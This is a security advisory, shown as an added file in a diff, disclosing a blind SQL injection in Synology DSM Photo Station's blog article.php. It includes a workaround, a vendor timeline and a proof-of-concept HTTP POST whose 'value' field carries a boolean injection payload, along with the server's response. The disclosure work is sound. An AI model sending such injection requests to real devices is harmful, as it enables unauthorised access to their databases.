@@ -1,0 +1,54 @@
+~~~~~~
+Title: Synology DSM Blind SQL Injection
+Version affected: <= 4.3-3827
+Vendor: Synology
+Discovered by: Michael Wisniewski
+Status: Patched
+~~~~~~
+
+The file "/photo/include/blog/article.php" contains a Blind SQL
+Injection Vulnerability in the 'value' variable in the URL.
+
+The vendor was contacted approximately 2 weeks ago.  They reviewed the
+information and determined that it is vulnerable and a patch has been
+released.  The DSM5 official release contains this patch, which was
+released earlier this week.  An update for DSM4.x will be released
+later this month to address this issue in the 4.x line.  The vendor
+also stated that it will be fixed in the next Photo Station hotfix for
+the 4.x line.
+
+Work-around: If you don't use the blog, just rename the file.
+
+~~~~~~
+POST /photo/include/blog/article.php HTTP/1.1
+Content-Length: 59
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: <ip>:80/ <http://10.0.1.15:80/>
+Cookie: PHPSESSID=<foo>; visit_day=<foo>
+Host: <foo>
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/28.0.1500.63 Safari/537.36
+Accept: */*
+
+list_type=label&value=1%20AND%203*2*1%3d6%20AND%20812%3d812
+~~~~~~
+
+It responds with:
+
+All posts without a label
+Synology Blog
+2008-01-01 00:00:00 Published by:Synology Blog
+
+~~~~~~
+
+Timeline:
+- 3/1/14: Contacted Vendor with Details of Vulnerability and Exploit.
+- 3/2/14: Vendor responded with 'they are investigating'.
+- 3/4/14: Vendor responded with it being fixed in DSM5 and DSM4.x (4.x
+patched later in the month)
+- 3/10/14: DSM5 Released
+- 3/10/14: Contacted Vendor Final Time to make sure it's OK to release the
+information.
